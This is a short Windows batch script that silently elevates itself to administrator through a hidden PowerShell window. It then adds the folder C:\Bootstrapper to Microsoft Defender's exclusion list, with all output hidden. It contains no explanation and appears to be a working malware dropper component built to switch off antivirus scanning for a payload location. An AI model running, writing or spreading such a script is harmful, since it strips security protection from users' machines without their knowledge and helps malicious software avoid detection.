@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
    exit /b
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Bootstrapper'" >nul 2>&1
exit /b
